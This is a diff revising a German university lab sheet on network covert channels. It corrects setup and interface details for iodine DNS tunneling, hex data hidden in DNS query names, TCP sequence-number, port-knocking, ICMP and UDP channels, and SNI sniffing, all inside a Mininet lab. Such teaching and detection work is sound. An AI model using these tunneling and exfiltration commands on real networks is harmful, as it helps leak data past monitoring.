@@ -2,31 +2,27 @@
 
 [:material-file-pdf-box: Als PDF herunterladen](../../pdf/06-advanced-covert-channels.pdf){ .md-button }
 
-!!! warning "Zwei Werkzeuge vor dem Start von `topo01` installieren, nicht in den Knoten-Fenstern"
+!!! warning "Zusatzwerkzeuge vor dem Start von `topo01` im Desktop-Terminal installieren"
     Für dieses Aufgabenblatt gibt es kein eigenes Topologie-Skript – ihr
-    arbeitet in der euch bereits bekannten Topologie `topo01`. Zwei der
-    verwendeten Werkzeuge sind nicht vorinstalliert (siehe
+    arbeitet in der bekannten Topologie `topo01`. Drei Werkzeuge sind nicht
+    vorinstalliert (siehe
     [Desktop-/Mininet-Umgebung](../reference/umgebung.md)): `iodine` für
-    DNS-Tunneling (Teil 2) und `tshark` für JA3-Fingerprinting (Teil 5).
+    DNS-Tunneling (Teil 2) sowie `tshark` und `jq` für JA3-Fingerprinting
+    (Teil 5).
 
-    Installiert **beide vorab im normalen Desktop-Terminal, bevor ihr
-    `./start-topo01.sh` startet**:
+    Installiert sie im Desktop-Terminal, bevor ihr `./start-topo01.sh`
+    startet:
 
     ```bash
     sudo apt-get update
     sudo apt-get install -y iodine tshark jq
     ```
 
-    Das Desktop-Terminal hat einen funktionierenden Internetzugriff und
-    einen funktionierenden Namens-Resolver. Die Knoten-Fenster `h1`/`h2`
-    (die `mininet> xterm h1`/`xterm h2` bzw. `start-topo01.sh` euch öffnen)
-    haben dagegen **keinen funktionierenden Standard-DNS-Resolver** – ein
-    `apt install` dort scheitert mit `Temporary failure resolving
-    '<host>'`, selbst wenn `curl`/`dig` gegen eine fest angegebene IP wie
-    `1.1.1.1` in denselben Fenstern anschließend funktioniert. Einmal im
-    Desktop-Terminal installiert, stehen die Programme danach auch in
-    `h1`/`h2` zur Verfügung (gemeinsames Dateisystem, nur die
-    Netzwerk-Namensräume unterscheiden sich).
+    `h1` und `h2` teilen sich das Dateisystem des Desktops (nur die
+    Netzwerk-Namensräume unterscheiden sich), also stehen die Programme
+    nach der Installation auch in den Knoten bereit. Von den Knoten selbst
+    erreicht nur `h1` das Internet; auf `h2` schlägt ein `apt install`
+    fehl, weil `h2` keine externen Ziele erreicht.
 
 ## Lernziele
 
@@ -76,13 +72,14 @@ cd ~/rn-practice/topo01
     ```
 
 2. Erzeugt auf `h1` in einem zweiten Terminal Verkehr gegen `h2`
-    (`10.0.6.2`, ueber `r1`/`r2` geroutet) und gegen einen externen
-    DNS-Resolver ueber den NAT-Uplink von `h1`:
+    (`10.0.6.2`, ueber `r1`/`r2` geroutet) und loest einen externen Namen
+    ueber den von `topo01` eingetragenen Resolver auf (Weg nach draussen
+    ueber den NAT-Uplink von `h1`):
 
     ```bash
     h1$ ping -c 4 10.0.6.2
-    h1$ dig @1.1.1.1 becke.net
-    h1$ dig +tcp @1.1.1.1 becke.net
+    h1$ dig becke.net
+    h1$ dig +tcp becke.net
     h1$ curl becke.net
     ```
 
@@ -154,18 +151,14 @@ Wireshark sichtbar gemacht werden.
     Ohne `-P` fragt `iodined` interaktiv nach einem Passwort; Server und
     Client müssen dasselbe verwenden.
 
-2. **Optional, für die transparente Variante:** Konfiguriert auf `h1`
-    `dnsmasq` so, dass `h2` seine DNS-Anfragen über `h1` sendet (siehe
-    `dnsmasq`-Konfiguration, die `topo01` bereits für die `dig`-Übung in
-    Lab 01 verwendet; `dnsmasq` ist im Kurs-Image nicht vorinstalliert, siehe
-    [Aufgabenblatt 01](01-netzwerkgrundlagen-tools.md)). Für den Tunnel
-    selbst reicht Schritt 3 unten auch ohne diesen Schritt, weil dort `h1`
-    direkt als Nameserver angegeben wird.
+2. **Optional, für die transparente Variante:** In `topo01` läuft auf `h1`
+    bereits ein `dnsmasq`, über den `h2` seine Namen auflöst. Für den Tunnel
+    selbst reicht Schritt 3 unten, weil der Client dort `h1` direkt als
+    Nameserver angegeben bekommt.
 
 3. Verbindet euch auf `h2` als Client (mit demselben Passwort und demselben
-    Topdomain wie oben), und gebt `h1` explizit als Nameserver an – der
-    Standard-Resolver in `/etc/resolv.conf` zeigt zuerst auf einen von außen
-    unerreichbaren internen Docker-Resolver, nicht auf `h1`:
+    Topdomain wie oben) und gebt `h1` (`10.0.1.2`) explizit als Nameserver
+    an:
 
     ```bash
     h2$ sudo iodine -P geheim123 10.0.1.2 tunnel.h1
@@ -254,32 +247,31 @@ bzw. TTL-Manipulation.
     die Größe des Felds, oder etwas anderes an der Art, wie ihr es benutzt?
 
 !!! example "Vertiefung (optional): Dieselbe Nachricht, andere Kodierung"
-    Verpackt **denselben** Text noch einmal, aber in einer anderen Kodierung –
-    etwa hexadezimal (`xxd -p`) statt Base64, oder umgekehrt. Vergleicht
-    dann dreierlei: die Länge der entstandenen Zeichenkette, die Anzahl der
-    dafür nötigen Anfragen und das Zeichenvorrat-Bild der Namen.
+    Verpackt **denselben** Text einmal als Rohtext und einmal
+    base64-kodiert (`base64`) in die ICMP-Payload und vergleicht im
+    Hex-Dump des Mitschnitts, wie sich das Bild der Nutzdaten ändert.
 
-    Ein einzelnes DNS-Label darf höchstens 63 Zeichen lang sein, ein ganzer
-    Name 253. Rechnet aus, wie viele Nutzbytes euch je Anfrage bei eurer
-    Kodierung bleiben. Je mehr Zeichen eine Kodierung braucht, desto mehr
-    Anfragen entstehen – und desto auffälliger wird der Verkehr, ohne dass
-    sich am Inhalt irgendetwas geändert hätte.
+    Überlegt dann für den TTL-Kanal aus Schritt 4: Pro Paket trägt das
+    TTL-Feld nur ein einziges Zeichen. Rechnet aus, wie viele Pakete euer
+    Text damit braucht – und warum eine kompaktere Kodierung den Kanal
+    zwar kürzer, aber nicht unauffälliger macht.
 
 ### Teil 4 – DNS over HTTPS im Vergleich zu klassischem DNS
 
 **Ziel:** Führt DNS-Anfragen über HTTPS durch und analysiert, was im
 Mitschnitt im Vergleich zu klassischem DNS noch sichtbar ist.
 
-1. Klassisches DNS auf `h1`:
+1. Startet auf `h1` einen Mitschnitt, der klassisches DNS (Port 53) und den
+    DoH-Verkehr (TCP/443 zu `1.1.1.1`) zugleich erfasst:
 
     ```bash
-    h1$ dig @1.1.1.1 example.com
+    h1$ sudo tcpdump -i any -w /tmp/dns_plain.pcap "port 53 or host 1.1.1.1"
     ```
 
-2. Startet einen gezielten Mitschnitt:
+2. Löst `example.com` klassisch über den eingetragenen Resolver auf:
 
     ```bash
-    h1$ sudo tcpdump -i any host 1.1.1.1 -w /tmp/dns_plain.pcap
+    h1$ dig example.com
     ```
 
 3. Wiederholt dieselbe Abfrage über DNS-over-HTTPS:
@@ -341,6 +333,14 @@ mittels JA3-Fingerprint.
 
 **Ziel:** Verändert gezielt die Systemzeit und beobachtet die Auswirkungen
 auf TLS-Verbindungen.
+
+!!! note "Auf dem aktuellen Image nicht durchführbar"
+    Das Setzen der Systemzeit schlägt im Container fehl: `timedatectl`
+    setzt `systemd` als PID 1 voraus, `date -s` die Berechtigung
+    `CAP_SYS_TIME` – beides ist nicht gegeben (siehe
+    [Potenzielle Herausforderungen](#potenzielle-herausforderungen)).
+    Arbeitet die Schritte als Gedankenexperiment durch und meldet euch bei
+    der Kursleitung, wenn ihr an diese Grenze stoßt.
 
 1. Deaktiviert die Zeitsynchronisation auf `h1` und setzt eine falsche
     Zeit:
@@ -445,32 +445,33 @@ Teil 2 verlangte `iodine`, das erst per `apt install` aus dem Netz
 nachgeladen werden muss. Diesen verdeckten DNS-Kanal baut ihr hier mit einem
 Werkzeug, das im Image bereits liegt und dessen Innenleben ihr lesen könnt:
 dem Python-DNS-Server `dns-server.py` aus dem Topologie-Verzeichnis (siehe
-[Aufgabenblatt 01, Teil 4](01-netzwerkgrundlagen-tools.md)).
+[Aufgabenblatt 01, Teil 3](01-netzwerkgrundlagen-tools.md)).
 
 Die Idee eines DNS-Tunnels ist: Nutzdaten werden **in den abgefragten Namen**
 kodiert. Der Server muss die Namen gar nicht kennen – schon die *Anfrage*
 trägt die Daten über die Leitung.
 
-Startet den Server auf `h1` und einen gezielten DNS-Mitschnitt:
+Startet den Server auf `h1` auf Port 5353 (Port 53 belegt dort bereits
+`dnsmasq`) und einen DNS-Mitschnitt auf der Schnittstelle zu `h2`:
 
 ```bash
 h1$ cd ~/rn-practice/topo01
-h1$ python3 dns-server.py &
-h1$ sudo tcpdump -i h1-eth0 -w /tmp/dnschan.pcap udp port 53 &
+h1$ python3 dns-server.py 5353 &
+h1$ sudo tcpdump -i h1-eth1 -w /tmp/dnschan.pcap udp port 5353 &
 ```
 
 Kodiert auf `h2` eine kurze Nachricht als Hex und verpackt sie als Subdomain
 in eine DNS-Abfrage an den Server:
 
 ```bash
-h2$ msg=$(printf 'Hallo' | xxd -p)      # -> 48616c6c6f
-h2$ dig @10.0.1.2 "$msg.exfil.h1"
+h2$ msg=$(printf 'Hallo' | od -An -tx1 | tr -d ' ')   # -> 48616c6c6f
+h2$ dig @10.0.1.2 -p 5353 "$msg.exfil.h1"
 ```
 
 Beendet den Mitschnitt (`sudo pkill tcpdump`) und lest die Abfragenamen aus:
 
 ```bash
-h1$ tcpdump -r /tmp/dnschan.pcap -n | grep 'A?'
+h1$ tcpdump -r /tmp/dnschan.pcap -n | grep exfil
 ```
 
 **Aufgabe:** Der Hex-String steht im Klartext im Abfragenamen. Ein einzelnes
@@ -479,18 +480,18 @@ DNS-Label darf höchstens 63 Zeichen lang sein, ein ganzer Name höchstens 255
 Abfrage bleiben, wenn ihr hex-kodiert (zwei Zeichen je Byte). Woran erkennt
 ein Beobachter im Mitschnitt, dass hier kein normales DNS läuft?
 
-!!! quote "Fun Fact (belegt): warum ein DNS-Label bei 63 Zeichen endet"
+!!! quote "Hintergrund: warum ein DNS-Label bei 63 Zeichen endet"
     Ein DNS-Label endet nach höchstens **63** Oktetten, weil die zwei
     höchstwertigen Bits jedes Längen-Oktetts null sein müssen und nur sechs
     Bits für die Länge bleiben – 2⁶−1 = 63 (RFC 1035, Abschnitt 3.1). Der ganze
-    Name ist auf 255 Oktette begrenzt (Abschnitt 2.3.4 / 3.1). Klassische
-    Falle: als lesbarer **Text** sind nur **253** Zeichen möglich, weil das
-    Längenbyte des ersten Labels und das Null-Byte der Root zwei Oktette mehr
-    fressen, als die Punkte kosten. Genau diese knappen Grenzen zwingen einen
-    DNS-Tunnel zu vielen kurzen Anfragen – und machen ihn dadurch auffällig.
+    Name ist auf 255 Oktette begrenzt (Abschnitt 2.3.4 / 3.1). Als lesbarer
+    Text sind nur 253 Zeichen möglich, weil das Längenbyte des ersten Labels
+    und das Null-Byte der Root zwei Oktette mehr belegen, als die Punkte
+    kosten. Diese knappen Grenzen zwingen einen DNS-Tunnel zu vielen kurzen
+    Anfragen – und machen ihn dadurch auffällig.
 
-    - RFC 1035, Abschnitt 2.3.4/3.1 (rfc-editor): <https://www.rfc-editor.org/rfc/rfc1035.html> (Abruf 2026-09-25)
-    - R. Chen, „What is the real maximum length of a DNS name?": <https://devblogs.microsoft.com/oldnewthing/20120412-00/?p=7873> (Abruf 2026-09-25)
+    - RFC 1035, Abschnitt 2.3.4/3.1 (rfc-editor): <https://www.rfc-editor.org/rfc/rfc1035.html>
+    - R. Chen, „What is the real maximum length of a DNS name?": <https://devblogs.microsoft.com/oldnewthing/20120412-00/?p=7873>
 
 ### Teil 9 – Ein Kanal in der TCP-Sequenznummer (`topo01`)
 
@@ -503,7 +504,7 @@ Zeichnet auf `h1` TCP auf und schickt von `h2` ein einzelnes SYN mit einer
 selbst gewählten Sequenznummer (`hping3 -M`):
 
 ```bash
-h1$ sudo tcpdump -i h1-eth0 -w /tmp/seqchan.pcap tcp -c 2 &
+h1$ sudo tcpdump -i h1-eth1 -w /tmp/seqchan.pcap tcp -c 2 &
 h2$ sudo hping3 -c 1 -S -M 305419896 -p 80 10.0.1.2
 ```
 
@@ -518,7 +519,7 @@ Sequenznummer ein besonders schwer zu entdeckendes Versteck ist (Stichwort:
 ein *zufälliger* Wert ist normal, ein *strukturierter* fällt nur bei genauem
 Hinsehen auf). Welche Datenmenge passt pro Paket hinein?
 
-!!! quote "Fun Fact (belegt): Craig Rowland versteckte Daten schon 1997 in der Sequenznummer"
+!!! quote "Hintergrund: Craig Rowland versteckte Daten schon 1997 in der Sequenznummer"
     Die Idee, Nutzdaten in Kopffeldern zu verstecken, die eigentlich anderen
     Zwecken dienen, ist alt: Craig H. Rowland beschrieb 1997 in „Covert
     channels in the TCP/IP protocol suite" das Werkzeug `covert_tcp`, das Daten
@@ -527,8 +528,8 @@ Hinsehen auf). Welche Datenmenge passt pro Paket hinein?
     eigentlich nur dem Zusammensetzen von Fragmenten – RFC 6864, Abschnitt 7,
     stellt ausdrücklich fest, es „can more easily be used as a covert channel".
 
-    - RFC 6864, Abschnitt 7, und RFC 791, Abschnitt 3.1 (rfc-editor): <https://www.rfc-editor.org/rfc/rfc6864.html> (Abruf 2026-09-25)
-    - C. H. Rowland, „Covert channels in the TCP/IP protocol suite", First Monday 2(5), 1997: <https://firstmonday.org/ojs/index.php/fm/article/view/528> (Abruf 2026-09-25)
+    - RFC 6864, Abschnitt 7, und RFC 791, Abschnitt 3.1 (rfc-editor): <https://www.rfc-editor.org/rfc/rfc6864.html>
+    - C. H. Rowland, „Covert channels in the TCP/IP protocol suite", First Monday 2(5), 1997: <https://firstmonday.org/ojs/index.php/fm/article/view/528>
 
 !!! question "Kurz nachgedacht"
     Ein Beobachter, der nur diesen einen Mitschnitt sieht, ohne von einem
@@ -549,7 +550,7 @@ Zeichnet auf `h1` alle SYN-Pakete auf und „klopft" von `h2` eine feste
 Sequenz auf drei geschlossene Ports:
 
 ```bash
-h1$ sudo tcpdump -i h1-eth0 -w /tmp/knock.pcap tcp -c 6 &
+h1$ sudo tcpdump -i h1-eth1 -w /tmp/knock.pcap tcp -c 6 &
 h2$ for p in 7000 8000 9000; do sudo hping3 -c 1 -S -p $p 10.0.1.2; sleep 1; done
 ```
 
@@ -565,7 +566,7 @@ hin z. B. eine Firewall-Regel öffnet) für einen einfachen Portscan
 unsichtbar bleibt – und was den Kanal trotzdem verrät, wenn jemand den
 Gesamtverkehr aufzeichnet.
 
-!!! quote "Fun Fact (belegt): Port-Knocking – Authentifizierung über geschlossene Ports"
+!!! quote "Hintergrund: Port-Knocking – Authentifizierung über geschlossene Ports"
     Martin Krzywinski prägte den Begriff 2003: „port knocking provides an
     authentication system that works across closed ports". Der Clou: Hinter der
     Firewall lauscht gar kein Port, die Information reist allein in der
@@ -574,13 +575,13 @@ Gesamtverkehr aufzeichnet.
     nicht einmal feststellen, dass das Verfahren überhaupt aktiv ist. (Ein RFC
     existiert dafür nicht.)
 
-    - Linux Journal, M. Krzywinski, „Port Knocking" (16.06.2003): <https://www.linuxjournal.com/article/6811> (Abruf 2026-09-25)
-    - Autorenseite M. Krzywinski, portknocking: <https://mk.bcgsc.ca/portknocking/view/about/summary/> (Abruf 2026-09-25)
+    - Linux Journal, M. Krzywinski, „Port Knocking" (16.06.2003): <https://www.linuxjournal.com/article/6811>
+    - Autorenseite M. Krzywinski, portknocking: <https://mk.bcgsc.ca/portknocking/view/about/summary/>
 
 ### Teil 11 – Ein ungewöhnlicher Träger: die ICMP-Timestamp-Nachricht (`topo01`)
 
 Teil 3 nutzte die Nutzlast von ICMP-**Echo** (Typ 8) – der klassische,
-dokumentierte ICMP-Kanal (siehe Fun Fact unten). ICMP kennt aber weitere
+dokumentierte ICMP-Kanal (siehe Hintergrund unten). ICMP kennt aber weitere
 Typen, die kaum je auftauchen und einem einfachen Regelwerk deshalb selten
 auffallen – etwa die **Timestamp**-Nachricht (Typ 13/14, RFC 792, Abschnitt
 „Timestamp or Timestamp Reply Message"). Hier beobachtet ihr zunächst nur,
@@ -590,7 +591,7 @@ lässt.
 Zeichnet ICMP auf `h1` auf und schickt von `h2` eine Timestamp-Anfrage:
 
 ```bash
-h1$ sudo tcpdump -i h1-eth0 -v -w /tmp/icmpts.pcap icmp -c 2 &
+h1$ sudo tcpdump -i h1-eth1 -v -w /tmp/icmpts.pcap icmp -c 2 &
 h2$ sudo hping3 --icmp-ts -c 1 10.0.1.2
 ```
 
@@ -607,18 +608,17 @@ als belegte Praxis): warum wären diese drei Felder *strukturell* geeignet, um
 Daten zu transportieren, und warum ist ein selten genutzter, aber völlig
 legitimer ICMP-Typ schwerer zu bemerken als offensichtlicher Sonderverkehr?
 
-!!! quote "Fun Fact (belegt): der dokumentierte ICMP-Kanal ist die Echo-Nutzlast (Project Loki, 1996)"
+!!! quote "Hintergrund: der dokumentierte ICMP-Kanal ist die Echo-Nutzlast (Project Loki, 1996)"
     Der klassische, tatsächlich dokumentierte verdeckte ICMP-Kanal steckt nicht
     in der Timestamp-, sondern in der **Echo**-Nachricht: „Project Loki"
     (Phrack 49, 1996) zeigte, dass „arbitrary information can be tunneled in
     the data portion of ICMP_ECHO and ICMP_ECHOREPLY packets". Die
     Timestamp-Nachricht aus diesem Teil hat mit ihren drei senderbestimmten
-    32-Bit-Feldern (RFC 792) zwar dieselbe strukturelle Eignung – aber das ist
-    eine Folgerung, kein belegter Angriff. Ehrliche Quellenarbeit heißt, diesen
-    Unterschied zu benennen.
+    32-Bit-Feldern (RFC 792) dieselbe strukturelle Eignung – das bleibt aber
+    eine Folgerung, kein dokumentierter Angriff.
 
-    - „Project Loki", Phrack 49, File 06 (1996): <https://phrack.org/issues/49/project-loki-icmp-tunneling.html> (Abruf 2026-09-25)
-    - RFC 792, Abschnitt „Timestamp or Timestamp Reply Message" (rfc-editor): <https://www.rfc-editor.org/rfc/rfc792.html> (Abruf 2026-09-25)
+    - „Project Loki", Phrack 49, File 06 (1996): <https://phrack.org/issues/49/project-loki-icmp-tunneling.html>
+    - RFC 792, Abschnitt „Timestamp or Timestamp Reply Message" (rfc-editor): <https://www.rfc-editor.org/rfc/rfc792.html>
 
 ### Teil 12 – Klartext trotz TLS: die Ziel-Domain (SNI) mitlesen (`topo01`)
 
@@ -637,7 +637,7 @@ einen Mitschnitt:
 ```bash
 h1$ cd ~/rn-practice/topo01
 h1$ ./startHTTP3Server.sh &
-h1$ sudo tcpdump -i h1-eth0 -A -w /tmp/sni.pcap tcp port 443 &
+h1$ sudo tcpdump -i h1-eth1 -A -w /tmp/sni.pcap tcp port 443 &
 ```
 
 Baut von `h2` eine TLS-Verbindung mit einem frei gewählten Servernamen auf:
@@ -660,19 +660,18 @@ was das für einen Beobachter bedeutet, der den Inhalt zwar nicht entschlüsseln
 kann, aber sehr wohl sieht, **welche** Seiten ihr ansteuert. (Genau das ist
 die Motivation hinter *Encrypted ClientHello*, ECH.)
 
-!!! quote "Fun Fact (belegt): die SNI im Klartext – und warum es dafür seit 2026 einen RFC-Gegenspieler gibt"
+!!! quote "Hintergrund: die SNI im Klartext – und ihr RFC-Gegenspieler"
     Die Ziel-Domain reist unverschlüsselt, weil der Server erst *aus* der SNI
     erfährt, welches Zertifikat er überhaupt vorlegen soll (RFC 6066, Abschnitt
     3, definiert die Erweiterung; RFC 8744, Abschnitt 2, hält die
-    Klartext-Eigenschaft fest). Pikant ist der historische Blick: RFC 6066,
-    Abschnitt 11.1, hielt 2011 noch fest, `server_name` bringe „no significant
-    security issues" mit sich. Genau dieses Leck beseitigt *Encrypted
-    ClientHello* – seit März 2026 als **RFC 9849** standardisiert, das die
-    Klartext-SNI „perhaps the most sensitive information left unencrypted in
-    TLS 1.3" nennt.
+    Klartext-Eigenschaft fest). RFC 6066, Abschnitt 11.1, bewertete
+    `server_name` noch als „no significant security issues". Dieses Leck
+    adressiert *Encrypted ClientHello* (RFC 9849), das die Klartext-SNI
+    „perhaps the most sensitive information left unencrypted in TLS 1.3"
+    nennt.
 
-    - RFC 6066, Abschnitt 3, und RFC 9849, Abschnitt 1 (rfc-editor): <https://www.rfc-editor.org/rfc/rfc9849.html> (Abruf 2026-09-25)
-    - Cloudflare Blog, „Encrypted Client Hello" (29.09.2023): <https://blog.cloudflare.com/announcing-encrypted-client-hello/> (Abruf 2026-09-25)
+    - RFC 6066, Abschnitt 3, und RFC 9849, Abschnitt 1 (rfc-editor): <https://www.rfc-editor.org/rfc/rfc9849.html>
+    - Cloudflare Blog, „Encrypted Client Hello" (29.09.2023): <https://blog.cloudflare.com/announcing-encrypted-client-hello/>
 
 !!! question "Kurz nachgedacht"
     ECH verschlüsselt die SNI selbst. Was bleibt für einen Beobachter auf dem
@@ -692,7 +691,7 @@ den raffinierteren Verstecken gegenüber.
 Startet auf `h1` einen UDP-Empfänger und einen Mitschnitt, sendet von `h2`:
 
 ```bash
-h1$ sudo tcpdump -i h1-eth0 -A -w /tmp/udpchan.pcap udp port 9999 &
+h1$ sudo tcpdump -i h1-eth1 -A -w /tmp/udpchan.pcap udp port 9999 &
 h1$ socat -u UDP-RECV:9999 -
 h2$ echo 'EXFIL_UDP' | socat - UDP-SENDTO:10.0.1.2:9999
 ```
@@ -742,24 +741,21 @@ Kanäle erkennen könnte – **ohne** eine einzige Nutzlast zu entschlüsseln.
 --8<-- "issue-feedback.md"
 ## Potenzielle Herausforderungen
 
-- **`iodine` und `tshark` sind nicht vorinstalliert** (siehe
-  [Desktop-/Mininet-Umgebung](../reference/umgebung.md)) und müssen zur
-  Laufzeit per `apt install` nachinstalliert werden. `apt-get update` und
-  `apt-get install -y tshark iodine` laufen im Container fehlerfrei durch –
-  ausgehender Internetzugriff und die nötigen Rechte für `apt install` sind
-  vorhanden.
+- **`iodine`, `tshark` und `jq` sind nicht vorinstalliert** (siehe
+  [Desktop-/Mininet-Umgebung](../reference/umgebung.md)) und müssen vor dem
+  Start von `topo01` im Desktop-Terminal installiert werden (siehe Hinweis
+  am Blattanfang). Von den Knoten erreicht nur `h1` das Internet; auf `h2`
+  schlägt ein `apt install` fehl.
 - **`timedatectl`** setzt systemd als PID 1 voraus und schlägt daher fehl
   (`System has not been booted with systemd as init system (PID 1). Can't
-  operate.`). Ein direktes `date -s "next monday 10:00"` als Alternative
-  scheitert ebenfalls, mit `date: cannot set date: Operation not permitted`
-  (dem granularen Capability-Set des Containers fehlt `CAP_SYS_TIME`). Teil 6
-  dieses Aufgabenblatts ist auf dem aktuellen Image daher **nicht
-  durchführbar** – meldet euch bei der Kursleitung, wenn ihr an diese Grenze
-  stoßt, statt lange nach einem eigenen Workaround zu suchen.
+  operate.`). Auch `date -s "next monday 10:00"` scheitert, mit
+  `date: cannot set date: Operation not permitted` (dem Capability-Set des
+  Containers fehlt `CAP_SYS_TIME`). Teil 6 ist auf dem aktuellen Image daher
+  **nicht durchführbar**; meldet euch bei der Kursleitung, wenn ihr an diese
+  Grenze stoßt.
 - **Kein dediziertes `topoXX`-Skript für dieses Lab** – alle Übungen laufen
-  in der bereits bekannten `topo01`-Topologie. Ein funktionierender
-  `dnsmasq`-Forward von `h2` auf `h1` (Teil 2, Schritt 2) ist bewusst nicht
-  bis ins letzte Detail vorgegeben – das ist Teil der Übung.
+  in der bekannten `topo01`-Topologie. Dort löst `dnsmasq` auf `h1` die
+  Namen für `h1` und `h2` auf.
 
 ## Quellen
 
